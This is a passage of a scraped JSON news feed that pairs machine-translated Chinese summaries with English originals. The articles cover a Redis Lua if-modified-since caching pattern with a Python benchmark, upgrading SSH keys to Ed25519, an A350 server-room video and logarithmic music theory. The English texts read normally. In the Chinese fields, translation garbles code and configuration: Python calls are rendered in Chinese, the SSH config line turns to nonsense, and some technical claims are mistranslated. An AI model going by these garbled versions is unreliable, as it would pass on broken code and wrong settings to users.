hget\uff06\uff0339;\uff0ckeys_mtime_hset\uff0ckey_mtime = tonumber\uff08key_mtime\uff09 - \u5982\u679c\u54c8\u5e0c\u96c6\u4e2d\u7684\u7f3a\u5c11\u952e\u8fd4\u56de\u952e\u7684\u503c.--\u6216\u952emtime\uff06gt;\u5982\u679c\u4e0d\u662fkey_mtime\u6216key_mtime\uff06gt; mtime\u7136\u540e\uff0c\u7136\u540e\u8fd4\u56deredis.call\uff08\uff06\uff0339; get\uff06\uff0339;\uff0ckey\uff09endroTurn\u96f6\uff06\uff0334;\uff06\uff0334;\uff06\uff0334; mtime_set =\uff06\uff0334;\uff06\uff0334; local keys_mtime_hset =\uff06\uff0334; my_keysmtime\uff06\uff0334; local key =\u952e[1]\u672c\u5730\u503c= argv [1]\u672c\u5730mtime = tonumber\uff08argv [2]\uff09redis .call\uff08\uff06\uff0339; set\uff06\uff0339; key\uff0cvalue\uff09redis.call\uff08\uff06\uff0339; hset\uff06\uff0339; keys_mtime_hset\uff0ckey\uff0cmtime\uff09\uff06\uff0334;\uff06\uff0334;\uff06\uff0334; m1 = int\uff08\u65f6\u95f4\uff08\uff09\uff09r = redis\u3002 redis\uff08host =\uff06\uff0339; localhost\uff06\uff0339;\uff0cport = 6379\uff09mtget = r\u3002 register_script\uff08mtime_get\uff09mtset = r\u3002 register_script\uff08mtime_set\uff09t_k =\uff06\uff0334;\u4f60\u597d\uff06\uff0334; t_v =\uff06\uff0334;\u4e16\u754c\uff06\uff0334; r\u3002\u5220\u9664\uff08t_k\uff09\u6253\u5370\uff08mtget\uff08keys = [t_k]\uff0cargs = [m1]\uff09\uff09\u6253\u5370\uff08mtset\uff08keys = [t_k]\uff0cargs = [t_v\uff0cm1]\uff09\uff09\u6253\u5370\uff08r\u3002get\uff08t_k\uff09\uff09\u6253\u5370\uff08mtget\uff08keys = [t_k]\uff0cargs = [m1-100]\uff09\uff09\u6253\u5370\uff08mtget\uff08keys = [t_k]\uff0cargs = [m1 + 100]\uff09\uff09\uff09\n      \u8fd9\u4f1a\u4ea7\u751f\u591a\u5c11\u5f00\u9500\uff1f\u4e00\u4e2a\u7b80\u5355\u7684\u57fa\u51c6\u663e\u793a\u4e0d\u5e94\u5f88\u591a\uff0c\u56e0\u4e3aHGet\u662fO\uff081\uff09\u64cd\u4f5c\u3002\n  \u91cd\u590d= 10000\u53f7= 3 g = timeit\u3002\u8ba1\u65f6\u5668\uff08\uff06\uff0334; r.get\uff08t_k\uff09\uff06\uff0334;\uff0cglobals = globals\uff08\uff09\uff09timings_get = g\u3002\u91cd\u590d\uff08\u91cd\u590d=\u91cd\u590d\uff0c\u6570\u5b57=\u6570\u5b57\uff09g = timeit\u3002\u5b9a\u65f6\u5668\uff08\uff06\uff0334; mtget\uff08keys = [t_k]\uff0cargs = [m1  -  100]\uff09\uff06\uff0334;\uff0cglobals = globals\uff08\uff09\uff09timings_hits_mtget = g\u3002\u91cd\u590d\uff08\u91cd\u590d=\u91cd\u590d\uff0c\u6570\u5b57=\u6570\u5b57\uff09g = timeit\u3002\u8ba1\u65f6\u5668\uff08\uff06\uff0334; mtget\uff08keys = [t_k]\uff0cargs = [m1 + 100]\uff09\uff06\uff0334;\uff0cglobals = globals\uff08\uff09\uff09timings_miss_mtget = g\u3002\u91cd\u590d\uff08\u91cd\u590d=\u91cd\u590d\uff0c\u6570\u5b57=\u6570\u5b57\uff09\n  \u4ece\u8be5\u57fa\u51c6\u6d4b\u8bd5\u4e2d\u8fd0\u884c\u5e76\u7ed8\u5236\u65f6\u95f4\uff0cx\u8f74\u662f\u547c\u53eb\u7684\u65f6\u95f4\u3002\n    \u6b63\u5982\u9884\u671f\u7684\u90a3\u6837\uff0c\u6709\u8f7b\u5fae\u7684\u5f00\u9500\uff0c\u666e\u901a\u662f\u57fa\u4e8e\u6700\u5feb\u7684\u4fee\u6539\u65f6\u95f4\u7684\u6700\u6162\u3002\u8bf7\u53c2\u9605\u6b64Jupyter Notebook\u4ee5\u83b7\u53d6\u5168\u5de5\u4f5c\u793a\u4f8b\u548c\u56fe\u8868\u6e90\u3002 ", "note_en": "The  if modified since type of pattern for retrieving data from cache can save significant network bandwidth and compute cycles.\n  The data modification time reference should be from the client side and be sent as part of the request and not assumed on server side based on a non acknowledgement type of method like simply last time the client connected to the server.\n  This kind of pattern is possible on redis server side leveraging  lua on  redis, with very less overhead in terms of latency.\n  We can store the last modification time of a key in a  hash and retrieve the value only if it is newer than the time client sent.\n  The following Lua snippets store/retrieve based on the modification time of key in a hash called  MY_KEYSTIME.\n    local  keys_mtime_hset  =  &#34;MY_KEYSMTIME&#34; local  key  =  KEYS [ 1 ] local  mtime  =  tonumber ( ARGV [ 1 ]) local  key_mtime  =  redis . call ( &#39;HGET&#39; ,  keys_mtime_hset ,  key ) key_mtime  =  tonumber ( key_mtime ) -- if missing key in the hash set return the value of the key. -- or key mtime &gt; mtime  if  not  key_mtime  or  key_mtime  &gt;  mtime  then  return  redis . call ( &#39;GET&#39; ,  key ) end return  nil\n    local  keys_mtime_hset  =  &#34;MY_KEYSMTIME&#34; local  key  =  KEYS [ 1 ] local  value  =  ARGV [ 1 ] local  mtime  =  tonumber ( ARGV [ 2 ]) redis . call ( &#39;SET&#39; ,  key ,  value ) redis . call ( &#39;HSET&#39; ,  keys_mtime_hset ,  key ,  mtime )\n  Client sends the modification time while retrieving and setting the key. Redis Lua scripts are  atomic.\n    mtime_get = &#34;&#34;&#34;local keys_mtime_hset = &#34;MY_KEYSMTIME&#34;local key = KEYS[1]local mtime = tonumber(ARGV[1])local key_mtime = redis.call(&#39;HGET&#39;, keys_mtime_hset, key)key_mtime = tonumber(key_mtime)-- if missing key in the hash set return the value of the key.-- or key mtime &gt; mtime if not key_mtime or key_mtime &gt; mtime then return redis.call(&#39;GET&#39;, key)endreturn nil &#34;&#34;&#34; mtime_set = &#34;&#34;&#34;local keys_mtime_hset = &#34;MY_KEYSMTIME&#34;local key = KEYS[1]local value = ARGV[1]local mtime = tonumber(ARGV[2])redis.call(&#39;SET&#39;, key, value)redis.call(&#39;HSET&#39;, keys_mtime_hset, key, mtime)&#34;&#34;&#34; m1  =  int ( time . time ()) r  =  redis . Redis ( host = &#39;localhost&#39; ,  port = 6379 ) MTGET = r . register_script ( mtime_get ) MTSET = r . register_script ( mtime_set ) t_k  =  &#34;Hello&#34; t_v  =  &#34;World&#34; r . delete ( t_k ) print ( MTGET ( keys = [ t_k ],  args = [ m1 ])) print ( MTSET ( keys = [ t_k ],  args = [ t_v ,  m1 ])) print ( r . get ( t_k )) print ( MTGET ( keys = [ t_k ],  args = [ m1  -  100 ])) print ( MTGET ( keys = [ t_k ],  args = [ m1  +  100 ]))\n      How much overhead will this incur ? A simple benchmark shows not a lot, since HGET is an O(1) operation.\n  REPEAT = 10000 NUMBER = 3 g  =  timeit . Timer ( &#34;r.get(t_k)&#34; , globals = globals ()) timings_get  =  g . repeat ( repeat = REPEAT ,  number = NUMBER ) g  =  timeit . Timer ( &#34;MTGET(keys=[t_k], args=[m1 - 100])&#34; , globals = globals ()) timings_hits_mtget  =  g . repeat ( repeat = REPEAT ,  number = NUMBER ) g  =  timeit . Timer ( &#34;MTGET(keys=[t_k], args=[m1 + 100])&#34; , globals = globals ()) timings_miss_mtget  =  g . repeat ( repeat = REPEAT ,  number = NUMBER )\n  Running and plotting the timings from this benchmark, x axis is time taken for calls.\n    As expected there is a slight overhead, with plain get being the fastest and modification time based get the slowest. See this  jupyter notebook for full working example and chart source.", "posttime": "2021-06-22 15:52:54", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u7f13\u5b58,\u670d\u52a1\u5668,server,\u65f6\u95f4", "title": "redis\u670d\u52a1\u5668\u4fa7if-modified  - \u7531\u4e8e\u4f7f\u7528lua\u7684\u7f13\u5b58\u6a21\u5f0f ", "title_en": "Redis server side if-modified-since caching pattern using lua", "transed": 1, "url": "https://blog.r4um.net/2021/redis-mtime-getset/", "via": "", "real_tags": ["\u7f13\u5b58", "\u670d\u52a1\u5668", "server", "\u65f6\u95f4"]}, {"category": "", "categoryclass": "", "imagename": "17705cbb9935c280f37841e5ca35addd.jpeg", "infoid": 1067386, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5982\u679c\u60a8\u662fDevOps\u5de5\u7a0b\u5e08\u6216Web\u5f00\u53d1\u4eba\u5458\uff0c\u60a8\u5df2\u7ecf\u6709\u5f88\u5927\u7684\u673a\u4f1a\uff0c\u60a8\u5df2\u7ecf\u719f\u6089\u5e76\u6bcf\u5929\u4f7f\u7528SSH\u5bc6\u94a5\u8eab\u4efd\u9a8c\u8bc1\u3002\u65e0\u8bba\u662f\u7528\u4e8e\u767b\u5f55\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fd8\u662f\u5c06\u63d0\u4ea4\u63a8\u5411\u8fdc\u7a0b\u5b58\u50a8\u5e93\u65f6\u3002\u5b83\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u6bd4\u4f20\u7edf\u7684\u57fa\u4e8e\u5bc6\u7801\u7684\u8eab\u4efd\u9a8c\u8bc1\u66f4\u597d\u7684\u5b89\u5168\u6027\u3002\n \u4f46\u662f\uff0c\u60a8\u6700\u540e\u4e00\u6b21\u521b\u5efa\u6216\u5347\u7ea7SSH\u5bc6\u94a5\u662f\u4ec0\u4e48\u65f6\u5019\uff1f\u60a8\u662f\u5426\u4f7f\u7528\u4e86\u6700\u65b0\u63a8\u8350\u7684\u516c\u94a5\u7b97\u6cd5\uff1f\u5982\u679c\u5b83\u8d85\u8fc7\u4e94\u5e74\u524d\u5e76\u4e14\u60a8\u4f7f\u7528\u9ed8\u8ba4\u9009\u9879\u751f\u6210\u4e86SSH\u5bc6\u94a5\uff0c\u60a8\u53ef\u80fd\u6700\u7ec8\u4f7f\u7528RSA\u7b97\u6cd5\uff0c\u5bc6\u94a5\u5927\u5c0f\u957f\u4e8e2048\u4f4d\u3002\n  \u8981\u68c0\u67e5\u8ba1\u7b97\u673a\u4e0a\u7684\u6240\u6709\u53ef\u7528SSH\u952e\uff0c\u8bf7\u5728\u7ec8\u7aef\u4e0a\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a\n   \ud83d\udea8dsa\uff1a\u5b83\u4e0d\u5b89\u5168\u4e14\u751a\u81f3\u4e0d\u518d\u652f\u6301openssh\u7248\u672c7\uff0c\u60a8\u9700\u8981\u5347\u7ea7\u5b83\uff01\n \u26a0\ufe0frsa\uff1a\u5b83\u53d6\u51b3\u4e8e\u952e\u5c3a\u5bf8\u3002\u5982\u679c\u5b83\u67093072\u62164096\u4f4d\u957f\u5ea6\uff0c\u90a3\u4e48\u4f60\u5f88\u597d\u3002\u5c11\u4e8e\u90a3\u4e2a\uff0c\u4f60\u53ef\u80fd\u60f3\u5347\u7ea7\u5b83\u3002 1024\u4f4d\u957f\u5ea6\u751a\u81f3\u88ab\u8ba4\u4e3a\u662f\u4e0d\u5b89\u5168\u7684\u3002\n \ud83d\udc40ECDSA\uff1a\u5b83\u53d6\u51b3\u4e8e\u60a8\u7684\u673a\u5668\u5982\u4f55\u751f\u6210\u968f\u673a\u6570\uff0c\u53ef\u4ee5\u7528\u4e8e\u521b\u5efa\u7b7e\u540d\u3002\u5bf9ECDSA\u4f7f\u7528\u7684NIST\u66f2\u7ebf\u4e5f\u6709\u4e00\u79cd\u53ef\u9760\u7684\u62c5\u5fe7\u3002\n  ED25519\u5728OpenSSH 6.5\u7248\u4e0a\u5f15\u5165\u3002\u5b83\u662f\u4f7f\u7528\u626d\u66f2\u7684Edwards\u66f2\u7ebf\u7684EDDSA\u5b9e\u73b0\u3002\u5b83\u4f7f\u7528\u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u672f\uff0c\u4e0eDSA\u6216ECDSA\u76f8\u6bd4\uff0c\u63d0\u4f9b\u66f4\u597d\u7684\u6027\u80fd\u3002 \n\u4eca\u5929\uff0cRSA\u662fSSH\u952e\u6700\u5e7f\u6cdb\u4f7f\u7528\u7684\u516c\u94a5\u7b97\u6cd5\u3002\u4f46\u4e0eED25519\u76f8\u6bd4\uff0c\u5982\u679c\u4f7f\u7528\u5c0f\u4e8e2048\u4f4d\u957f\u5ea6\u7684\u952e\u751f\u6210\uff0c\u5b83\u4f1a\u6162\u4e14\u751a\u81f3\u88ab\u8ba4\u4e3a\u662f\u4e0d\u5b89\u5168\u7684\u3002\n ED25519\u516c\u94a5\u7d27\u51d1\u3002\u4e0e\u5177\u6709544\u4e2a\u5b57\u7b26\u7684RSA 3072\u76f8\u6bd4\uff0c\u5b83\u53ea\u5305\u542b68\u4e2a\u5b57\u7b26\u3002\u751f\u6210\u5bc6\u94a5\u4e5f\u51e0\u4e4e\u4e0e\u7b7e\u540d\u8fc7\u7a0b\u4e00\u6837\u5feb\u3002\u4f7f\u7528ED25519\u6267\u884c\u6279\u91cf\u7b7e\u540d\u9a8c\u8bc1\u4e5f\u5f88\u5feb\u3002\u5b83\u5efa\u6210\u662f\u78b0\u649e\u5f39\u6027\u3002\u54c8\u5e0c\u51fd\u6570\u78b0\u649e\u4e0d\u4f1a\u7834\u574f\u7cfb\u7edf\u3002\n    \u60a8\u53ef\u4ee5\u5728\u8ba1\u7b97\u673a\u4e0a\u6709\u591a\u4e2aSSH\u952e\u3002\u56e0\u6b64\uff0c\u60a8\u53ef\u4ee5\u4fdd\u7559\u65e7\u7684SSH\u952e\u5e76\u751f\u6210\u4f7f\u7528ED25519\u7684\u65b0\u5efa\u3002\u8fd9\u6837\uff0c\u60a8\u4ecd\u7136\u53ef\u4ee5\u767b\u5f55\u4efb\u4f55\u8fdc\u7a0b\u670d\u52a1\u5668\u3002\u7136\u540e\u5c06\u9010\u4e2a\u9010\u4e2a\u9010\u4e2a\u66ff\u6362\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6388\u6743\u5bc6\u94a5\uff0c\u5176\u4e2d\u5305\u542b\u65b0\u751f\u6210\u7684ED25519\u516c\u94a5\u3002\n \u6253\u5f00\u7ec8\u7aef\u5e76\u952e\u5165\u4ee5\u4e0b\u547d\u4ee4\u4ee5\u751f\u6210\u4f7f\u7528ED25519\u7b97\u6cd5\u7684\u65b0SSH\u5bc6\u94a5\uff1a\n  \u5c06\u8981\u6c42\u60a8\u8f93\u5165\u6b64\u952e\u7684\u5bc6\u7801\u77ed\u8bed\uff0c\u4f7f\u7528\u5f3a\u5927\u7684\u5bc6\u94a5\u3002\u60a8\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e0e\u4efb\u4f55\u65e7\u7684SSH\u952e\u7c7b\u4f3c\u7684\u76f8\u540c\u5bc6\u7801\u3002\n -O\uff1a\u4f7f\u7528\u65b0\u7684OpenSSH\u683c\u5f0f\u800c\u4e0d\u662fPEM\u683c\u5f0f\u4fdd\u5b58\u79c1\u94a5\u3002\u5b9e\u9645\u4e0a\uff0c\u5f53\u60a8\u5c06\u952e\u7c7b\u578b\u6307\u5b9a\u4e3aED25519\u65f6\uff0c\u6697\u793a\u6b64\u9009\u9879\u3002\n -a\uff1a\u8fd9\u662fKDF\uff08\u5173\u952e\u63a8\u5bfc\u51fd\u6570\uff09\u8f6e\u7684\u6570\u91cf\u3002\u5982\u679c\u79c1\u94a5\u88ab\u76d7\uff0c\u8f83\u9ad8\u7684\u5bc6\u7801\u9a8c\u8bc1\u7684\u6570\u91cf\u4f1a\u5bfc\u81f4\u8f83\u6162\u7684\u5bc6\u7801\u9a8c\u8bc1\uff0c\u589e\u52a0\u5bf9\u86ee\u529b\u5bc6\u7801\u5f00\u88c2\u7684\u963b\u529b\u3002 \n-f\uff1a\u6307\u5b9a\u751f\u6210\u7684\u5bc6\u94a5\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u3002\u5982\u679c\u60a8\u5e0c\u671b\u88abSSH\u4ee3\u7406\u81ea\u52a8\u53d1\u73b0\u5b83\uff0c\u5b83\u5fc5\u987b\u5b58\u50a8\u5728\u4e3b\u76ee\u5f55\u4e2d\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u201c\u3002\n -c\uff1a\u6307\u5b9a\u6ce8\u91ca\u7684\u9009\u9879\u3002\u5b83\u7eaf\u7cb9\u662f\u4fe1\u606f\u6027\u7684\uff0c\u53ef\u4ee5\u662f\u4efb\u4f55\u4e1c\u897f\u3002\u4f46\u5b83\u901a\u5e38\u586b\u5145\uff06lt;\u767b\u5f55\uff06gt; @\uff06lt; hostname\uff06gt;\u8c01\u751f\u6210\u4e86\u5173\u952e\u3002\n  \u60a8\u53ef\u4ee5\u5728\u301c/ .ssh / id_ed25519\u548c\u516c\u94a5\u5904\u627e\u5230\u65b0\u751f\u6210\u7684\u79c1\u94a5.pub.pub\u3002\u59cb\u7ec8\u8bb0\u4f4f\uff0c\u60a8\u7684\u516c\u94a5\u662f\u60a8\u590d\u5236\u5230\u76ee\u6807\u4e3b\u673a\u4ee5\u8fdb\u884c\u8eab\u4efd\u200b\u200b\u9a8c\u8bc1\u7684\u5173\u952e\u5b57\u3002\n \u5728\u5411SSH\u4ee3\u7406\u6dfb\u52a0\u65b0\u7684\u79c1\u94a5\u4e4b\u524d\uff0c\u8bf7\u786e\u4fdd\u901a\u8fc7\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u8fd0\u884cSSH\u4ee3\u7406\uff1a\n  \u7136\u540e\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u4ee5\u5c06\u65b0\u751f\u6210\u7684ED25519\u5bc6\u94a5\u6dfb\u52a0\u5230SSH\u4ee3\u7406\uff1a\n  \u6216\u8005\u5982\u679c\u8981\u5728\u9ed8\u8ba4\u7684.ssh\u76ee\u5f55\u4e0b\u6dfb\u52a0\u6240\u6709\u53ef\u7528\u952e\uff0c\u53ea\u9700\u8fd0\u884c\uff1a\n   \u5982\u679c\u60a8\u4f7f\u7528\u7684\u662fMacOS Sierra 10.12.2\u6216\u66f4\u9ad8\u7248\u672c\uff0c\u5219\u4f1a\u81ea\u52a8\u52a0\u8f7d\u952e\u5e76\u5c06\u5bc6\u7801\u5b58\u50a8\u5728\u94a5\u5319\u4e32\u4e2d\uff0c\u60a8\u9700\u8981\u914d\u7f6e\u301c/ .ssh / config\u6587\u4ef6\uff1a \nhost * addkeystoagent\u662f\u4f7f\u7528eymerchain\u662fidentityfile\u301c/ .ssh / id_ed25519 Identityfile\u301c/ .ssh / id_rsa\uff03\u5982\u679c\u60a8\u613f\u610f\uff0c\u8bf7\u4fdd\u7559\u4efb\u4f55\u65e7\u5bc6\u94a5\u6587\u4ef6  SSH\u534f\u8bae\u5df2\u5141\u8bb8\u5ba2\u6237\u7aef\u63d0\u4f9b\u591a\u4e2a\u952e\uff0c\u670d\u52a1\u5668\u5c06\u9009\u62e9\u5b83\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1\u7684\u952e\u3002 \u4f46\u662f\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u6307\u5b9a\u7279\u5b9a\u7684\u79c1\u94a5\u4ee5\u4f7f\u7528\uff1a  \u6216\u8005\u60a8\u751a\u81f3\u53ef\u4ee5\u5c06\u6761\u76ee\u6dfb\u52a0\u5230\u301c/ .ssh / config\u6587\u4ef6\u4ee5\u914d\u7f6e\u4ee5\u4e0b\u9009\u9879\uff1a  \u4e00\u65e6\u5b83\u4fdd\u5b58\uff0c\u7a0d\u540e\u60a8\u53ef\u4ee5\u50cf\u8fd9\u6837SSH\u8fd9\u6837\u7684\u76ee\u6807\u4e3b\u673a\uff1a ", "note_en": "If you\u2019re a DevOps engineer or a web developer, there\u2019s a good chance that you\u2019re already familiar and using the SSH key authentication on a daily basis. Whether it\u2019s for logging into the remote server or when pushing your commit to the remote repository. It provides us with better security than the traditional password-based authentication.\n But, when is the last time you created or upgraded your SSH key? And did you use the latest recommended public-key algorithm? If it was more than five years ago and you generated your SSH key with the default options, you probably ended up using RSA algorithm with key-size less than 2048 bits long.\n  To check all available SSH keys on your computer, run the following command on your terminal:\n   \ud83d\udea8 DSA : It\u2019s unsafe and even no longer supported since OpenSSH version 7, you need to upgrade it!\n \u26a0\ufe0f RSA : It depends on key size. If it has 3072 or 4096-bit length, then you\u2019re good. Less than that, you probably want to upgrade it. The 1024-bit length is even considered unsafe.\n \ud83d\udc40 ECDSA : It depends on how well your machine can generate a random number that will be used to create a signature. There\u2019s also a  trustworthiness concern on the NIST curves that being used by ECDSA.\n  The Ed25519 was introduced on OpenSSH version 6.5. It\u2019s the EdDSA implementation using the  Twisted Edwards curve. It\u2019s using elliptic curve cryptography that offers a better security with faster performance compared to DSA or ECDSA.\n Today, the RSA is the most widely used public-key algorithm for SSH key. But compared to Ed25519, it\u2019s slower and even considered not safe if it\u2019s generated with the key smaller than 2048-bit length.\n The Ed25519 public-key is compact. It only contains 68 characters, compared to RSA 3072 that has 544 characters. Generating the key is also almost as fast as the signing process. It\u2019s also fast to perform batch signature verification with Ed25519. It\u2019s built to be collision resilence. Hash-function collision won\u2019t break the system.\n    You can have multiple SSH keys on your machine. So you can keep your old SSH keys and generate a new one that uses Ed25519. This way you can still log in to any of your remote servers. Then slowly replace the authorized key on your remote servers one by one with the newly generated Ed25519 public-key.\n Open up your terminal and type the following command to generate a new SSH key that uses Ed25519 algorithm:\n  You\u2019ll be asked to enter a passphrase for this key, use the strong one. You can also use the same passphrase like any of your old SSH keys.\n -o :  Save the private-key using the new OpenSSH format rather than the PEM format. Actually, this option is implied when you specify the key type as  ed25519.\n -a:  It\u2019s the numbers of KDF (Key Derivation Function) rounds. Higher numbers result in slower passphrase verification, increasing the resistance to brute-force password cracking should the private-key be stolen.\n  -f: Specify the filename of the generated key file. If you want it to be discovered automatically by the SSH agent, it must be stored in the default `.ssh` directory within your home directory.\n -C: An option to specify a comment. It\u2019s purely informational and can be anything. But it\u2019s usually filled with  &lt;login&gt;@&lt;hostname&gt; who generated the key.\n  You can find your newly generated private key at  ~/.ssh/id_ed25519 and your public key at  ~/.ssh/id_ed25519.pub. Always remember that your public key is the one that you copy to the target host for authentication.\n Before adding your new private key to the SSH agent, make sure that the SSH agent is running by executing the following command:\n  Then run the following command to add your newly generated Ed25519 key to SSH agent:\n  Or if you want to add all of the available keys under the default  .ssh directory, simply run:\n   If you\u2019re using macOS Sierra 10.12.2 or later, to load the keys automatically and store the passphrases in the Keychain, you need to configure your  ~/.ssh/config file:\n Host *  AddKeysToAgent yes  UseKeychain yes  IdentityFile ~/.ssh/id_ed25519  IdentityFile ~/.ssh/id_rsa # Keep any old key files if you want\n    The SSH protocol already allows the client to offer multiple keys on which the server will pick the one it needs for authentication. However, we can also specify a specific private-key to use like so:\n  Or you can even add an entry to the  ~/.ssh/config file to configure these options:\n  Once it\u2019s saved, later you can SSH to your target host like this:", "posttime": "2021-06-22 15:52:34", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u5347\u7ea7,ssh", "title": "\u5c06SSH\u952e\u5347\u7ea7\u5230ED25519 ", "title_en": "Upgrade Your SSH Key to Ed25519", "transed": 1, "url": "https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54", "via": "", "real_tags": ["\u5347\u7ea7", "ssh"]}, {"category": "", "categoryclass": "", "imagename": "3ff3697ed3b5d5b152365dbb36b1e009.jpg", "infoid": 1067385, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u9a7e\u9a76\u8231\u4e0b\u65b9\u7684\u98de\u884c\u7532\u677f\u8239\u5458\u4f11\u606f\u94fa\u4f4d\u548c\u7535\u5b50\u8231\u7684\u793a\u8303\u3002 \u822a\u7a7a\u548cunauthor\u7684\u4efb\u4f55\u4eba\u90fd\u6ca1\u6709\u771f\u6b63\u7684\u79d8\u5bc6...... ", "note_en": "A demonstration of the flight deck crew rest bunk and the electronics compartment below the cockpit. It's no real secret for anybody in aviation and unauthor...", "posttime": "2021-06-22 15:52:26", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "a350,server,\u7532\u677f", "title": "\u5728\u7a7a\u4e2d\u5ba2\u8f66A350\u7684\u670d\u52a1\u5668\u5ba4\u4e4b\u65c5 ", "title_en": "Tour of the server room in the Airbus 350", "transed": 1, "url": "https://www.youtube.com/watch?v=241-5DZyons", "via": "", "real_tags": ["a350", "server", "\u7532\u677f"]}, {"category": "", "categoryclass": "", "imagename": "16c15186bc3a397338cf2a31b145c9af.png", "infoid": 1067384, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u672c\u6587\u63cf\u8ff0\u7684\u89c6\u89c9\u8868\u73b0\u662f\u6211\u81ea\u5df1\u7684\u7814\u7a76\u548c\u5de5\u4f5c\u7684\u7ed3\u679c\uff0c\u4f46\u5e76\u4e0d\u5b8c\u5168\u6784\u6210\u65b0\u9896\u6027\u3002\u8fd9\u4e2a\u6570\u5b66\u56fe\u7684\u57fa\u7840\u6216\u57fa\u7840\u539f\u5219\u662f\u53e4\u4ee3\u5386\u53f21\u7684\u6570\u91cf\u77e9\u9635\uff0c\u53e4\u4ee3\u5386\u53f21\u540d\u79f0\u4e3a\u201c\u7f8a\u7f94\u201d\uff0c\u4e5f\u79f0\u4e3a\u5c3c\u53e4\u62c9\u65af\uff0c\u6bd5\u8fbe\u6208\u65af\u00b7\u5947\u57fa\uff0c\u67cf\u62c9\u56fe\u56db\u5341\u6b21\uff0c\u5170\u59c6\u5730\u533a\u7684\u5de8\u578b\u5c71\u8109\uff0c\u4f0f\u59c6\u65af\uff0c\u4ee5\u53ca\u9882\u6b4c\u9635\u5217\u3002 2\u5176\u4ed6\u540d\u79f0\u5305\u62ecMensa Pythagorica 3\u548c\u4e0a\u8ff0\u672f\u8bed\u7684\u7ec4\u5408\uff0c\u5982\u6bd5\u8fbe\u54e5\u5170\u8868\u3002\u4e0e\u7f94\u7f8a\u77e9\u9635\u627f\u62c5\u4e00\u5bf9\u4e00\u5173\u7cfb\u7684\u6574\u6570\u7cfb\u7edf\u662f\u7531\u884d\u751f\u7075\u6c28\u7075\u6c28\u9178\u65b9\u7a0b4\u4ea7\u751f\u7684Farey\u7cfb\u5217\u9f7f\u8f6e\u6bd4; 5\u548c\u8239\u5c3e\u5c0f\u9e21\u6811\u3002\u76f8\u5173\u6982\u5ff5\u5305\u62ec\u7531Ervin M.Wilson\u5728\u8be5\u8c10\u6ce2\u6bd4\u7684\u8fd9\u79cd\u7f51\u683c\u5185\u90e8\u6620\u5c04\u7684arvin M.Wilson\uff0c\u4ee5\u53ca\u6784\u6210\u539f\u59cb\u6982\u5ff5\u7684\u72ed\u7a84\u53d1\u5c55\u7684Partch-Meyer-Novaro Tonity\u94bb\u77f3\u7ed3\u6784\u3002\n  \u6211\u7684\u7248\u672c\u7684\u65b0\u9896\u6027\u662f\u901a\u8fc7\u4f7f\u7528\u56fe\u5f62\u7cfb\u7edf\u6570\u5b66\u5bb6\u79f0\u4e4b\u4e3a\u201c\u5bf9\u6570\u201d\u7684\u97f3\u4e50\u5b9e\u4f53\u7684\u51c6\u786e\u8868\u793a\uff0c\u5176\u4e2d\u6211\u79f0\u4e4b\u4e3a\u201cSonic\u201d\uff0c\u5176\u4e2d\u773c\u775b\u4ee5\u4e0e\u8033\u6735\u7684\u65b9\u5f0f\u76f8\u540c\u7684\u65b9\u5f0f\u770b\u5230\u8272\u8c03\u7a7a\u95f4\u7684\u5206\u5e03\u4ed6\u4eec\u3002\n  \u5b8c\u6210\u7814\u7a76\u540e\uff0c\u5728\u4ecb\u7ecd\u6784\u5efa\u4f53\u7684\u4ecb\u7ecd\u540e\uff0c\u6211\u6765\u8c03\u7528\u201calmonicomb\u201d\uff08\u77ed\u6682\u7684\u8c10\u6ce2\u7ec4\u5408\u77e9\u9635\u201c\uff09\uff0c\u4e5f\u53ef\u4ee5\u79f0\u4e3a\u201d\u5bf9\u6570\u6bd5\u8fbe\u54e5\u5170\u7f94\u7f8a\u201c\uff0c\u6211\u5728\u4e00\u672c\u540d\u4e3a\u201d\u6559\u79d1\u4e66\u7684\u5bf9\u6570\u6bd5\u8fbe\u54e5\u5170\u7f94\u7f8a\u201c\u8c10\u6ce2\u201c\u540c\u4e00\u6982\u5ff5\u7684\u5448\u73b0\uff0c\u7814\u7a76\u4e86\u5bf9\u6570\u6d4b\u91cf\u7684\u7279\u6b8a\u5e94\u7528\uff0c\u5bf9\u6570\u503c\u6d4b\u91cf\u7684\u4e50\u89c2\u5170\u59c6\u7fa4\u77e9\u9635\u3002\u5b83\u7684\u4f5c\u8005\uff0cHans Kayser\uff0c\u5199\u9053\uff1a\n  \u00ab\u4e0e\u5148\u524d\u4f7f\u7528\u7684\u7b49\u8ddd\u5750\u6807\u7cfb\u76f8\u6bd4\uff0c\u6211\u4eec\u5728\u6b64\u5904\u4f7f\u7528\u5bf9\u6570\u7cfb\u7edf\uff0c\u5373\u5c06\u900f\u89c6\u4e2d\u5411\u4e2d\u5411\u5916\u900f\u660e\u5730\u9010\u6e10\u51cf\u5c11\u7684\u7cfb\u7edf\u3002\u6211\u4eec\u4f7f\u7528\u97f3\u8c03\u503c\u7684\u793a\u610f\u56fe\uff0c\u8fd9\u610f\u5473\u7740\u97f3\u8c03\uff0c\u5728\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u770b\u8d77\u6765\u4ed6\u4eec\u7684\u58f0\u97f3\uff08\u4e0d\u662f\u6211\u4eec\u6d4b\u91cf\u6216\u8ba1\u7b97\u5b83\u4eec\u7684\u65b9\u5f0f\uff09\u3002\u00bb 7.\n  